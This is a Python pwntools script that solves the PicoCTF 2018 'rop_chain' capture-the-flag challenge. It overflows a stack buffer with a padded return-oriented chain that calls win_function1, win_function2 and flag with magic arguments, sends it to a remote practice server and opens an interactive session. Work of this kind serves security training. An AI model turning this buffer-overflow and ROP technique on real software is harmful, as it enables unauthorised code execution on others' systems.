from pwn import *


def PicoCTF_2018_rop_chain(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/PicoCTF_2018_rop_chain'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28808)
    target_elf = ELF(file_name)

    win_function1_addr = p32(target_elf.symbols['win_function1'])
    win_function2_addr = p32(target_elf.symbols['win_function2'])
    flag_addr = p32(target_elf.symbols['flag'])

    pop_ret_gadget = p32(0x0804840d)  # pop ebx ; ret

    payload = b'A' * (0x18 + 0x4)
    # win_function1()
    payload += win_function1_addr
    # win_function2(int a1)
    payload += win_function2_addr + pop_ret_gadget + p32(0xBAAAAAAD)
    # flag(int a1)
    payload += flag_addr + pop_ret_gadget + p32(0xDEADBAAD)

    target.sendline(payload)

    print(target.recv())
    print(target.recv())

    target.interactive()


if __name__ == '__main__':
    PicoCTF_2018_rop_chain()
